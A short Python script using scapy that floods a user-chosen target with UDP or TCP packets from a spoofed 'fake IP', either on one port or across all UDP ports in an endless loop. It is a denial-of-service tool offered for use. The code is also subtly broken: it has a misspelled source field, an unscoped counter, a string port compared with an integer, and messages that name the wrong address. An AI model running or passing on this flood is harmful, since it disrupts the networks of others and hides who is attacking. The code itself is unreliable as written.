from scapy.all import *

a = int(input("Enter 1 for UDP or 2 for TCP protocol: "))
dst1 = input("Enter destination IP: ")
src1 = input("Enter your fake IP: ")
port = input("Enter port to send requests/packets (you may enter -1 to scan all ports in case of UDP only): ")

k=1

def udp(src1, dst1, port):
    while True: 
        if port==int(-1):
            for p in range(1,65534): 
                send(IP(sc=src1, dst=dst1)/UDP(dport=p)/Raw(load='abc'))        
                k=k+1
                print(f"Sent {k} packets to {src1} at port = {p}")
        else:
            send(IP(sc=src1, dst=dst1)/UDP(dport=port)/Raw(load='abc'))        
            k=k+1
            print(f"Sent {k} packets to {src1} at port = {port}")

def tcp(src1, dst1, port):
    while True: 
        send(IP(sc=src1, dst=dst1)/TCP(dport=port)/"GET / HTTP/1.0\r\n\r\n")        
        k=k+1
        print(f"Sent {k} packets to {src1} at port = {port}")

if a ==int(1):
    udp(src1, dst1, port)
elif a ==int(2):
    tcp(src1, dst1, port)
else:
    print("Wrong Choice. Either select 1 or 2 for TCP or UDP protocol.")
